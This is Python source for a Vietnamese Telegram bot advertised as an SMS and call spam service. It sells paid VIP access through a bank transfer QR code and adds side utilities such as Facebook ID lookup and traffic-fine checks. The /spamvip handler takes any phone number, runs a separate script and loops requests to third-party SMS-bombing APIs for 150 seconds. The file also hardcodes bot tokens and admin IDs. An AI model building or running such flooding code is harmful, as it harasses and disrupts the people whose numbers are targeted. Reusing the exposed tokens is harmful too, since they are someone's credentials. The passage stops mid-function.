import telebot
import os
import subprocess
import time
import datetime
import time
import os,sys,re
import subprocess
import requests
import datetime
import datetime
import sqlite3
import psutil
import hashlib
import random
import json
import socket
import logging
import sys
from bs4 import BeautifulSoup
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib.parse import urlparse
import threading
from io import BytesIO
import requests
import socket
import cohere
from time import strftime
from telebot import types
from gtts import gTTS
import tempfile
from telegram.ext import CallbackContext
from telegram import Update, ChatMember
import qrcode
import sqlite3
from telebot import TeleBot
from PIL import Image
from datetime import date
from datetime import datetime
from datetime import datetime as dt
from concurrent.futures import ThreadPoolExecutor
from telebot import apihelper
from telebot.types import Message
from collections import Counter


# Kích hoạt middleware
apihelper.ENABLE_MIDDLEWARE = True
# Configuration Variables
admins = ["Ngocdoian"]  # Admin username without '@'
name_bot = "VuThiHoa"       # Bot name
zalo = "https://tinyurl.com/2y79qkkp"        # Contact info


#bot chính: 7233629917:AAECbyze0wXlYBVkIE1EX8CBm4sHxaexHjg
#bot phụ: 7263955371:AAHkl6syD_cLbMQISw1cw-GOmPNWG-UMBrk
# Bot Token
bot = telebot.TeleBot("7233629917:AAECbyze0wXlYBVkIE1EX8CBm4sHxaexHjg")  # Token bot
# Initialization Message
print("Bot đã được khởi động thành công")
cooldowns = {}
# Admin Usernames and IDs
ADMIN_ID = {6033886040, 6620239777}   # List of admin ID

# Hàm kiểm tra quyền admin
def is_admin(message):
    user_id = message.from_user.id  # ID người dùng (kiểu int)
    print(f"🔍 Kiểm tra quyền admin cho ID: {user_id}")  # Debug
    print(f"📋 Danh sách admin: {ADMIN_ID}")  # Debug

    if user_id in ADMIN_ID:
        print("✅ Người dùng này là admin!")
        return True
    else:
        print("❌ Người dùng này không có quyền admin!")
        return False
    
# Variables for Bot Functionality
lan = {}
notifi = {}
auto_spam_active = False
last_sms_time = {}
allowed_users = []
processes = []
last_command_time = {}
user_state = {}
conversation_history = {}
sent_messages = []  # Khai báo biến là một danh sách rỗng

# Database Connection
connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# API Configuration
BASE_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent'

def check_command_cooldown(user_id, command, cooldown):
    current_time = time.time()
    
    if user_id in last_command_time and current_time - last_command_time[user_id].get(command, 0) < cooldown:
        remaining_time = int(cooldown - (current_time - last_command_time[user_id].get(command, 0)))
        return remaining_time
    else:
        last_command_time.setdefault(user_id, {})[command] = current_time
        return None

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
    now = str(datetime.date.today())
    return now


def load_users_from_database():
  cursor.execute('SELECT user_id, expiration_time FROM users')
  rows = cursor.fetchall()
  for row in rows:
    user_id = row[0]
    expiration_time = datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
    if expiration_time > datetime.now():
      allowed_users.append(user_id)

# Danh sách ID nhóm được phép sử dụng bot
# ID box chính: -1002281816867
# ID box phụ: -1002345897140
ALLOWED_GROUP_IDS = [-1002281816867]  # Thay bằng ID nhóm của bạn

# Danh sách ID admin được phép sử dụng bot qua tin nhắn riêng
ALLOWED_ADMIN_IDS = [6620239777, 6033886040]  # Thay bằng ID admin của bạn


# Hàm kiểm tra quyền
def check_access(message):
    if message.chat.type == "private":  # Tin nhắn riêng
        if message.from_user.id not in ALLOWED_ADMIN_IDS:
            bot.reply_to(message, "❌ Bot chỉ hỗ trợ trong nhóm https://t.me/BoxTienIch.")
            return False
    elif message.chat.type in ["group", "supergroup"]:  # Tin nhắn trong nhóm
        if message.chat.id not in ALLOWED_GROUP_IDS:
            bot.reply_to(message, "❌ Bot chỉ hoạt động trong nhóm https://t.me/BoxTienIch.")
            return False
    else:
        bot.reply_to(message, "❌ Bot không hỗ trợ trong loại chat này.")
        return False
    return True
def save_user_to_database(connection, user_id, expiration_time):
  cursor = connection.cursor()
  cursor.execute(
    '''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
  connection.commit()

# Kiểm tra và tạo thư mục VIP
if not os.path.exists("./vip"):
    os.makedirs("./vip")

if not os.path.exists("./reg_VIP.txt"):
    open("./reg_VIP.txt", "w").close()

# Lệnh /add reg hoặc /add spam: Thêm thông tin VIP hoặc reg
@bot.message_handler(commands=['add'])
def add_vip_or_reg(message):
    if not is_admin(message):  # Kiểm tra quyền admin
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(
            message,
            '❌ Vui lòng nhập đúng cú pháp:\n'
            '/add spam <UID> <Ngày hết hạn vd:(31-12-2xxx)> <Số lần>\n'
            'hoặc\n/add reg <UID> <Số lần>.'
        )
        return

    command_type = parts[1]
    uid = parts[2]

    if command_type == "spam":  # Thêm VIP
        if len(parts) != 5:
            bot.reply_to(message, '❌ Vui lòng nhập đúng cú pháp: /add spam <UID> <Ngày hết hạn vd:(31-12-2xxx)> <Số lần>.')
            return

        expiration_date = parts[3]
        usage_limit = parts[4]

        try:
            expiration_date_obj = datetime.strptime(expiration_date, '%d-%m-%Y').date()
        except ValueError:
            bot.reply_to(message, '❌ Ngày không hợp lệ. Vui lòng sử dụng định dạng vd:(31-12-2xxx).')
            return

        # Lưu thông tin VIP vào file
        with open(f"./vip/{uid}.txt", "w") as file:
            file.write(f"{expiration_date}|{usage_limit}")

        bot.reply_to(message, f'✅ Đã thêm VIP cho UID {uid}:\n- Ngày hết hạn: {expiration_date}\n- Số lần sử dụng: {usage_limit}')

    elif command_type == "reg":  # Thêm quyền /regvip
        if len(parts) != 4:
            bot.reply_to(message, '❌ Vui lòng nhập đúng cú pháp: /add reg <UID> <Số lần>.')
            return

        usage_limit = parts[3]

        # Đọc nội dung file reg_VIP.txt
        with open("./reg_VIP.txt", "r") as file:
            lines = file.readlines()

        # Cập nhật hoặc thêm mới UID
        updated_lines = []
        replaced = False
        for line in lines:
            if line.startswith(uid + "|"):  # Tìm dòng trùng UID
                updated_lines.append(f"{uid}|{usage_limit}\n")
                replaced = True
            else:
                updated_lines.append(line)

        # Nếu không tìm thấy UID, thêm mới
        if not replaced:
            updated_lines.append(f"{uid}|{usage_limit}\n")

        # Ghi lại vào file
        with open("./reg_VIP.txt", "w") as file:
            file.writelines(updated_lines)

        if replaced:
            bot.reply_to(message, f'✅ Đã cập nhật quyền sử dụng lệnh /regvip cho UID {uid} với số lần: {usage_limit}')
        else:
            bot.reply_to(message, f'✅ Đã thêm quyền sử dụng lệnh /regvip cho UID {uid} với số lần: {usage_limit}')

    else:
        bot.reply_to(message, '❌ Lệnh không hợp lệ. Hãy dùng /add spam hoặc /add reg.')

@bot.message_handler(commands=['reset_user'])
def reset_user(message):
    if not is_admin(message):  # Kiểm tra quyền admin
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    # Đường dẫn đến thư mục user
    user_directory = './user'

    # Kiểm tra nếu thư mục user tồn tại
    if not os.path.exists(user_directory):
        bot.reply_to(message, 'Không tìm thấy thư mục chứa dữ liệu người dùng.')
        return

    # Duyệt qua các thư mục từ 1 đến 31
    for day in range(1, 32):
        day_directory = os.path.join(user_directory, str(day))
        if os.path.exists(day_directory):  # Nếu thư mục ngày đó tồn tại
            # Duyệt qua tất cả các tệp trong thư mục ngày đó và xóa các tệp .txt
            for filename in os.listdir(day_directory):
                file_path = os.path.join(day_directory, filename)
                if os.path.isfile(file_path) and filename.endswith('.txt'):
                    os.remove(file_path)  # Xóa tệp .txt

            # Nếu bạn muốn xóa cả thư mục sau khi xóa các tệp .txt, dùng shutil.rmtree:
            # shutil.rmtree(day_directory)
    
    # Xóa tất cả các tệp .txt trong thư mục user (không theo ngày)
    for filename in os.listdir(user_directory):
        file_path = os.path.join(user_directory, filename)
        if os.path.isfile(file_path) and filename.endswith('.txt'):
            os.remove(file_path)  # Xóa tệp .txt
    
    bot.reply_to(message, "Tất cả các tệp dữ liệu người dùng đã được reset.")

# Tạo từ điển để lưu thời gian spam cuối cùng của mỗi người dùng
cooldown_dict = {}
processes = []

name_bot = "SpamBot"  # Tên bot của bạn (thay đổi tùy ý)

# Hàm xử lý lệnh /spamvip
video_url = "https://files.catbox.moe/2vx7k6.mp4"

@bot.message_handler(commands=['spamvip'])
def spamvip(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Ẩn danh"
    vip_file_path = f"./vip/{user_id}.txt"

    if not os.path.exists(vip_file_path):
        bot.reply_to(message, 'Thông tin VIP không hợp lệ. Vui lòng liên hệ admin.')
        return

    with open(vip_file_path) as fo:
        data = fo.read().split("|")

    try:
        expiration_date = data[0]
        expiration_date_obj = datetime.strptime(expiration_date, '%d-%m-%Y').date()
    except (ValueError, IndexError):
        bot.reply_to(message, 'Thông tin VIP không hợp lệ. Vui lòng liên hệ admin.')
        return

    today = date.today()
    if today > expiration_date_obj:
        bot.reply_to(message, 'Key VIP đã hết hạn. Vui lòng liên hệ admin.')
        os.remove(vip_file_path)
        return

    try:
        _, phone_number, lap = message.text.split()
    except ValueError:
        bot.reply_to(message, "Vui lòng nhập đúng cú pháp: /spamvip <số điện thoại> <số lần spam>")
        return

    if not lap.isnumeric() or not (1 <= int(lap) <= 10):
        bot.reply_to(message, "Vui lòng chọn số lần spam trong khoảng từ 1 đến 10.")
        return

    if phone_number in ["0985237602", "0326274360", "0339946702"]:
        bot.reply_to(message, "Không thể spam số ADMIN. Hành động bị cấm.")
        return

    current_time = datetime.now()
    if username in cooldown_dict and 'spam' in cooldown_dict[username]:
        last_time = cooldown_dict[username]['spam']
        time_elapsed = (current_time - last_time).total_seconds()
        cooldown = 60
        if time_elapsed < cooldown:
            bot.reply_to(
                message,
                f"⏳ Vui lòng đợi {cooldown - int(time_elapsed)} giây trước khi sử dụng lệnh này tiếp."
            )
            return

    cooldown_dict[username] = {'spam': current_time}

    # Chạy file smsv2.py
    file_path = os.path.join(os.getcwd(), "smsv2.py")
    process = subprocess.Popen(["python3", file_path, phone_number, str(lap)])
    processes.append(process)

    # Gọi API spam SMS
    url1 = f"http://160.191.245.126:5000/vsteam/api?key=tmrvirus-free&sdt={phone_number}"
    url2 = f"https://api.natnetwork.sbs/spamsms?phone={phone_number}&count=10"
    threading.Thread(target=spam_sms, args=(phone_number, url1, url2)).start()

    message_text = (f'''
> ┌──────⭓ SPAM VIP ⭓──────
> │» User: @{username} đã gửi spam                      
> │» Spam: Thành Công [✓]
> │» User: VIP PLAN
> │» Attacking: {phone_number}
> │» Admin: Ngocdoian 
> │» Số lần: {lap}
> │» Telegram Admin: @Ngocdoian
> └────────────[✓]─────────
    ''')
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')

def spam_sms(phone, url1, url2):
    start_time = time.time()
    end_time = start_time + 150
    while time.time() < end_time:
        try:
            requests.get(url1, timeout=10)
            requests.get(url2, timeout=10)
        except requests.exceptions.RequestException:
            pass

# Lệnh dừng spam
@bot.message_handler(commands=['stop_spam'])
def stopspam(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    user_id = message.from_user.id

    # Kiểm tra xem người dùng có tiến trình nào đang chạy không
    if not processes:
        bot.reply_to(message, "Không có tiến trình spam nào đang chạy.")
        return

    # Dừng tất cả các tiến trình đang chạy
    stopped_count = 0
    for process in processes:
        # Kiểm tra nếu tiến trình vẫn đang chạy
        if process.poll() is None:  # Nếu tiến trình vẫn đang chạy
            process.terminate()  # Dừng tiến trình
            stopped_count += 1

    # Xóa các tiến trình khỏi danh sách sau khi đã dừng
    processes.clear()  # Xóa tất cả tiến trình

    if stopped_count > 0:
        bot.reply_to(message, f"Đã dừng tất cả tiến trình spam của bạn.")
    else:
        bot.reply_to(message, "Không có tiến trình spam nào cần dừng.")

# Lệnh check thời gian sử dụng VIP còn lại
@bot.message_handler(commands=['check_vip'])
def check_vip(message):
    user_id = message.from_user.id
    vip_file_path = f"./vip/{user_id}.txt"
    
    # Kiểm tra xem người dùng có file VIP không
    if not os.path.exists(vip_file_path):
        bot.reply_to(message, 'Bạn chưa đăng ký VIP. Vui lòng liên hệ admin để đăng ký.')
        return
    
    # Đọc dữ liệu từ file VIP
    with open(vip_file_path, 'r') as file:
        data = file.read().strip()

    # Tách ngày hết hạn và số ngày bằng dấu "|"
    try:
        expiration_date, expiration_days = data.split('|')
        expiration_date_obj = datetime.strptime(expiration_date, '%d-%m-%Y').date()
        expiration_days = int(expiration_days)
    except ValueError:
        bot.reply_to(message, 'Dữ liệu VIP không hợp lệ. Vui lòng liên hệ admin.')
        return
    
    # Kiểm tra xem key VIP đã hết hạn chưa
    today = date.today()
    if today > expiration_date_obj:
        bot.reply_to(message, 'Key VIP của bạn đã hết hạn. Vui lòng liên hệ admin để gia hạn.')
        os.remove(vip_file_path)  # Xóa file VIP nếu hết hạn
        return

    # Tính toán số ngày còn lại
    remaining_days = (expiration_date_obj - today).days
    bot.reply_to(message, f"Key VIP của bạn còn {remaining_days} ngày nữa.\nNgày hết hạn: {expiration_date_obj.strftime('%d-%m-%Y')}")

@bot.message_handler(commands=['huyvip'])
def remove_vip(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Xin cung cấp ID người dùng để huỷ quyền VIP.')
        return

    user_id = int(message.text.split()[1])
    # Xóa VIP trong file
    vip_file_path = f"./vip/{user_id}.txt"
    if os.path.exists(vip_file_path):
        os.remove(vip_file_path)
        bot.reply_to(message, f'Người dùng {user_id} đã bị huỷ quyền VIP thành công.')
    else:
        bot.reply_to(message, f'Người dùng {user_id} không phải là VIP.')

start_time = time.time()  # Ghi lại thời gian bắt đầu

def get_elapsed_time():
    elapsed_time = time.time() - start_time  # Tính thời gian đã trôi qua
    return elapsed_time

users_keys = {}  # Khai báo users_keys nếu chưa có

# Hàm kiểm tra key
def is_key_approved(chat_id, key):
    if chat_id in users_keys:
        user_key, timestamp = users_keys[chat_id]
        if user_key == key:
            current_time = datetime.datetime.now()
            if current_time - timestamp <= datetime.timedelta(hours=2):
                return True
            else:
                del users_keys[chat_id]
    return False

# Hàm escape_markdown đã sửa
def escape_markdown(text):
    """Thoát các ký tự đặc biệt để sử dụng trong chế độ MarkdownV2"""
    if text is None:
        text = "unknown_user"  # Gán giá trị mặc định nếu username là None
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in escape_chars else char for char in text)
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    user_id = message.from_user.id  # Lấy ID của người dùng gửi tin nhắn

    # Kiểm tra nếu ID người dùng chưa có trong file thì ghi vào
    with open('id', 'r') as file:
        if str(user_id) not in file.read():  # Chỉ kiểm tra ID người dùng, không phải ID nhóm
            with open('id', 'a') as file:
                file.write(str(user_id) + '\n')  # Lưu ID người dùng vào file

    username = escape_markdown(message.from_user.username)
    xinchao = f"""<blockquote> 🚀📖⭐BOT SPAM CALL + SMS⭐📖🚀 </blockquote>
<b>[⭐] Xin chào @{username}</b> 
<blockquote expandable>📖 Tất cả lệnh dành cho người dùng
📝 Danh Sách Lệnh Bot:
📋 /start - Xem Danh Sách Lệnh
🛠️ /admin - Thông Tin Admin
Vip Vip
🔑 /getkey_spam - Để Lấy Key spam
🔑 /key_spam - Nhập Key Và Xài Spam
🚨 /spam - Spam SMS
🎗️ /muavip - Để đc xài lệnh spamvip
Lệnh Reg UGphone 👽
👾 /REG - Show Tất Cả Lệnh Reg
Lấy QR Văn Bản
🔎 /qr - Chuyển Văn Bản Thành QR
Lấy Thông Tin
🔎 /down - Tải Video Bằng Link
🔎 /info - Thông Tin Tele
🔎 /getid - Để Lấy ID fb
🔎 /fb - BẢO TRÌ
🔎 /avtfb - Lấy AVT FB Xuyên Khiên
🔎 /capcut - Lấy Thông Tin CAPCUT
Ảnh Đẹp Gái Xinh
👩‍🎤 /gai - Ảnh Gái xinh and sexy
🎥 /anime - Ảnh Anime
Tiện Ích
🔉 /voice - Văn bản thành giọng nói
🎟️ /html - Code Web
🌐 /check - Thông Tin Web
📡 /checkip - Check IP
🚨 /vi_pham - Check Phạt Nguội
⏳ /time - Thời gian hoạt động
🎗️ /bank-/muavip - Để Mua VIP 
🏆 Lệnh cho key VIP: /lenh_VIP
Ủng Hộ Admin Để Có VPS Xịn.</blockquote>"""

    # Tạo các nút nằm ngang
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("👤 Admin", url="https://t.me/Ngocdoian"),
        types.InlineKeyboardButton("🤖 Bot", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://files.catbox.moe/xbgx14.mp4"
    bot.send_video(message.chat.id, video_url, caption=xinchao, parse_mode='HTML', reply_markup=keyboard)

# Hàm lấy Facebook ID từ API
def get_facebook_id(link: str) -> str:
    api_url = f"https://api.sumiproject.net/facebook/uid?link={link}"
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        return data.get('id', 'Không tìm thấy ID')
    else:
        return f"Lỗi API: {response.status_code}"
    
start_time = time.time()  # Ghi lại thời gian bắt đầu

def get_elapsed_time():
    elapsed_time = time.time() - start_time  # Tính thời gian đã trôi qua
    return elapsed_time

@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}') 

@bot.message_handler(commands=['lenh_VIP'])
def send_welcome(message):
    username = message.from_user.username
    lenhvip = f"""<blockquote> 🚀📖⭐BOT SPAM CALL + SMS⭐📖🚀 </blockquote>
<b>[⭐] Xin chào @{username}</b> 
<blockquote expandable>📖 Tất Cả câu lệnh dành cho ADM
️🥈Lệnh Cho VIP
» /spamvip: Spam call siêu nhiều
» /check_vip: Để check thời gian VIP của mình
» hiện tại thì chưa thêm vài chức năng nên là xài tạm nhe !
</blockquote>"""
        
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("👤 Admin", url="https://t.me/Ngocdoian"),
        types.InlineKeyboardButton("🤖 Bot", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://imgur.com/SFIAM1t.mp4"
    bot.send_video(message.chat.id, video_url, caption=lenhvip, parse_mode='HTML', reply_markup=keyboard)


@bot.message_handler(commands=['lenh_ADM'])
def send_welcome(message):
    username = message.from_user.username
    lenhadmin = f"""<blockquote> 🚀📖⭐BOT SPAM CALL + SMS⭐📖🚀 </blockquote>
<b>[⭐] Xin chào @{username}</b> 
<blockquote expandable>📖 Tất Cả câu lệnh dành cho ADM
🔰Lệnh Cho Admin
» /cpu: Để xem cấu hình
» /restart: Để khởi động lại bot
» /stop: (⚠️Lưu ý⚠️ xài là tắt luôn)
» /all: Để thông báo cho cả nhóm
» /huyvip: Để hủy vip bằng id
» /stop_spam: Để stop spam sms lại
» /im: Để khóa mõm 
» /unim: Để mở khóa mõm
» /add: Để thêm người dùng vào vip
» /lock: Để khóa chat
» /unlock: Để mở chat
» /reset_user: Để reset file user
» /id_you: Để lấy id người khác
» /ban: Để kick người dùng</blockquote>"""
        
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("👤 Admin", url="https://t.me/Ngocdoian"),
        types.InlineKeyboardButton("🤖 Bot", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://imgur.com/SFIAM1t.mp4"
    bot.send_video(message.chat.id, video_url, caption=lenhadmin, parse_mode='HTML', reply_markup=keyboard)
    
@bot.message_handler(commands=['REG'])
def regug(message):
    username = message.from_user.username
    lenhvip = f"""<blockquote> 🚀📖⭐BOT SPAM CALL + SMS⭐📖🚀 </blockquote>
<b>[⭐] Xin chào @{username}</b> 
<blockquote expandable>📖 Tất Cả câu lệnh REG
️💩Lệnh REG
🚨 /reg - Reg Mail Để Xài UGphone
🚨 /reg1 - Lệnh Reg Dự Phòng
🚨 /regvip - Plan VIP KHông Cần Vượt Link
🔑 /getkey_reg - Tạo Link Key 
🔑 /key_reg - Lệnh Để Nhập Key (vd: /key_reg 123 )
!!! Lưu ý !!! Nhớ để ý lệnh /getkey với lệnh /getkey_reg là 2 lệnh khác nhau nhé
Đây Là Cách Xài reg mail: https://t.me/BoxTienIch/5593
» hiện tại thì chưa thêm vài chức năng nên là xài tạm nhe !
</blockquote>"""
        
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("🤖 Nhắn Cho Bot Ở Đây", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://imgur.com/SFIAM1t.mp4"
    bot.send_video(message.chat.id, video_url, caption=lenhvip, parse_mode='HTML', reply_markup=keyboard)


@bot.message_handler(commands=['muavip'])
def send_welcome(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    user_id = message.from_user.id
    with open('id', 'r') as file:
        if str(message.chat.id) not in file.read():
            with open('id', 'a') as file:
                file.write(str(message.chat.id) + '\n')
    username = escape_markdown(message.from_user.username)
    xinchao = f"""     ⭓ {escape_markdown(name_bot)} ⭓
» Xin chào @{username}
» /bank: Bank tiền
"""
    video_url = "https://files.catbox.moe/yaztwg.mp4"
    bot.send_video(message.chat.id, video_url, caption=xinchao, parse_mode='MarkdownV2')
@bot.message_handler(commands=['bank'])
def handle_bank(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    markup = types.InlineKeyboardMarkup()
    btn_MB = types.InlineKeyboardButton(text='MB', callback_data='MB')
    markup.add(btn_MB)
    bot.reply_to(message, "Vui Lòng Chọn Bank:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ['MB'])
def handle_bank_selection(call):
    user_id = call.from_user.id
    if call.data == 'MB':
        qr_code_url = f"https://img.vietqr.io/image/MB-953899999-print.jpg?amount=30000&addInfo=napvip_{user_id}&accountName=THE-NGOC"
        caption = f"""
> ┌────⭓ MB BANK ⭓────
> ├ Ngân Hàng: MB BANK
> ├ STK: 953899999
> ├ Tên: THE NGOC
> ├ ND: napvip_{user_id}
> ├ Số Tiền: 30.000 VNĐ
> └───────[✓]───────

Lưu Ý:
    + Khi Bank Nhớ Nhập Đúng Nội Dung Chuyển Tiền.
    + Khi Bank Xong Vui Lòng Liên Hệ @Ngocdoian Để Add Vip.
    + Khi liên hệ telegram ko đc thì liên hệ zalo ADMIN.
    + ZALO: https://tinyurl.com/2y79qkkp
"""
        # Escape the caption
        caption = escape_markdown(caption)

        bot.send_photo(call.message.chat.id, qr_code_url, caption=caption, parse_mode='MarkdownV2')
@bot.message_handler(commands=['admin'])
def send_admin_info(message):
    username = message.from_user.username
    admin_info = f'''
    ⭓ {escape_markdown(name_bot)} ⭓
    » Xin chào @{escape_markdown(username)}
    » Admin: @Ngocdoian
    » Zalo: {escape_markdown(zalo)}
    » Telegram: @{escape_markdown(admins)}
    » Lưu Ý: Spam Liên
       Tục Lệnh Ăn Ban
       Đừng Kêu Mở 
    '''
    video_url = "https://files.catbox.moe/5l74tr.mp4"
    bot.send_video(message.chat.id, video_url, caption=admin_info, parse_mode='MarkdownV2')

@bot.message_handler(commands=['cpu'])
def check_system_info(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    cpu_percent = psutil.cpu_percent()
    memory_percent = psutil.virtual_memory().percent

    message_text = f"🖥 Thông Tin Pc 🖥\n\n" \
                   f"🇻🇳 Admin: NgocDoiAn\n\n" \
                   f"📊 Cpu: {cpu_percent}%\n" \
                   f"🧠 Memory: {memory_percent}%"
    bot.reply_to(message, message_text)

@bot.message_handler(commands=['restart'])
def restart(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    bot.reply_to(message, '🚀 Bot sẽ được khởi động lại trong giây lát... 🚀')
    time.sleep(10)
    python = sys.executable
    os.execl(python, python, *sys.argv)

@bot.message_handler(commands=['stop'])
def stop(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    bot.reply_to(message, '🚀 Bot sẽ dừng lại trong giây lát... 🚀')
    time.sleep(1)
    bot.stop_polling()

is_bot_active = True
import os
import subprocess
import time

cooldown_dict = {}
processes = []

@bot.message_handler(commands=['all'])
def noti(message):
    if not is_admin(message):
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    # Chia tách lệnh và thông báo
    args = message.text.split(' ', 1)  # Tách phần sau của lệnh
    if len(args) < 2 or args[1].strip() == '':
        bot.reply_to(message, "Xin lỗi, không có nội dung thông báo")
        return

    # Đọc danh sách ID từ file
    with open('id', 'r') as file:
        user_ids = {line.strip() for line in file.readlines()}

    # Gửi video và thông báo tới từng người dùng
    for user_id in user_ids:
        try:
            chat_id = int(user_id)

            # Kiểm tra nếu chat_id là của nhóm (ID âm) thì bỏ qua
            if chat_id < 0:
                print(f"Bỏ qua nhóm với chat_id: {chat_id}")
                continue  # Bỏ qua nhóm, không gửi thông báo

            video_url = "https://files.catbox.moe/5l74tr.mp4"
            notification_message = f"{escape_markdown(args[1].strip())}"
            bot.send_video(chat_id, video_url, caption=notification_message, parse_mode='MarkdownV2')
            lan[chat_id] = {"count": 0}

        except Exception as e:
            print(f"Đang gửi thông báo tới {user_id}: Lỗi - {e}")
            # Sau khi gửi xong thông báo cho tất cả người dùng, trả lời thông báo thành công
    bot.reply_to(message, "Đã rải thông báo thành công đến tất cả người dùng!")

# Xử lý lệnh /getid

def get_facebook_id(facebook_url):
    try:
        # API URL để lấy Facebook ID từ liên kết
        api_url = f"https://keyherlyswar.x10.mx/Apidocs/findid.php?url={facebook_url}"
        response = requests.get(api_url)
        
        # Kiểm tra phản hồi từ API
        response.raise_for_status()  # Kiểm tra nếu có lỗi HTTP
        
        # Parse dữ liệu JSON trả về từ API
        data = response.json()
        
        # Kiểm tra nếu có thông tin ID trong dữ liệu trả về
        if 'id' in data:
            return data['id']
        else:
            return None
    except requests.exceptions.RequestException as e:
        # Nếu có lỗi trong quá trình gọi API
        print(f"Error: {e}")
        return None

@bot.message_handler(commands=['getid'])
def send_facebook_id(message):
    waiting_message = bot.reply_to(message, '🔍')

    try:
        # Tách link từ tin nhắn của người dùng
        link = message.text.split()[1]
        
        # Lấy Facebook ID từ liên kết
        facebook_id = get_facebook_id(link)
        
        if facebook_id:
            # Gửi ID với thông báo dạng yêu cầu
            bot.reply_to(message, f"Đây là ID của liên kết Facebook: {facebook_id}")
        else:
            bot.reply_to(message, "Không thể lấy ID từ liên kết Facebook này. Vui lòng kiểm tra lại.")
        
        # Xóa tin nhắn chờ sau khi hoàn thành
        bot.delete_message(message.chat.id, waiting_message.message_id)

    except IndexError:
        bot.reply_to(message, "Vui lòng cung cấp link Facebook hợp lệ sau lệnh /getid.")
        bot.delete_message(message.chat.id, waiting_message.message_id)


#sử lí lệnh vi_pham
def check_car_info(bsx):
    url = f'https://vietcheckcar.com/api/api.php?api_key=sfund&bsx={bsx}&bypass_cache=0&loaixe=1&vip=0'
    response = requests.get(url)
    return response.json()

@bot.message_handler(commands=['vi_pham'])
def handle_check(message):
    try:
        # Lấy biển số từ tin nhắn
        bsx = message.text.split()[1]
        # Gọi API và lấy kết quả
        car_info = check_car_info(bsx)

        # Kiểm tra nếu có vi phạm
        if car_info.get('totalViolations', 0) > 0:
            # Lấy thông tin vi phạm đầu tiên
            violation = car_info['violations'][0]

            # Trích xuất thông tin từ JSON
            bien_so = violation.get('bien_kiem_sat', 'N/A')
            trang_thai = violation.get('trang_thai', 'N/A')
            mau_bien = violation.get('mau_bien', 'N/A')
            loai_phuong_tien = violation.get('loai_phuong_tien', 'N/A')
            thoi_gian_vi_pham = violation.get('thoi_gian_vi_pham', 'N/A')
            dia_diem_vi_pham = violation.get('dia_diem_vi_pham', 'N/A')
            hanh_vi_vi_pham = violation.get('hanh_vi_vi_pham', 'N/A')
            don_vi_phat_hien_vi_pham = violation.get('don_vi_phat_hien_vi_pham', 'N/A')
            noi_giai_quyet_vu_viec = violation.get('noi_giai_quyet_vu_viec', 'N/A').replace('\\n', '\n')  # Xử lý \n trong JSON
            so_dien_thoai = violation.get('so_dien_thoai', 'N/A')
            muc_phat = violation.get('muc_phat', 'N/A')

            # Định dạng tin nhắn
            message_text = f'''
<blockquote expandable>┏━━━━━━━━━━━━━━━━━━━━━━━━┓
━━━━━━━━━𝙏𝙝𝙤̂𝙣𝙜 𝙩𝙞𝙣 𝙫𝙞 𝙥𝙝𝙖̣𝙢━━━━━━━━
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
» Biển số: {bien_so}

» Trạng thái: {trang_thai}

» Màu biển: {mau_bien}

» Loại phương tiện: {loai_phuong_tien}

» Thời gian vi phạm: {thoi_gian_vi_pham}

» Địa điểm vi phạm: {dia_diem_vi_pham}

» Hành vi vi phạm: {hanh_vi_vi_pham}

» Đơn vị phát hiện vi phạm: {don_vi_phat_hien_vi_pham}

» Nơi giải quyết vụ việc: {noi_giai_quyet_vu_viec}</blockquote>'''

            # Gửi tin nhắn với thông tin
            bot.send_message(message.chat.id, {message_text}, parse_mode="HTML")

        else:
            bot.send_message(message.chat.id, f"<blockquote>Biển số xe {bsx} không có lỗi vi phạm.</blockquote>", parse_mode="HTML")

    except IndexError:
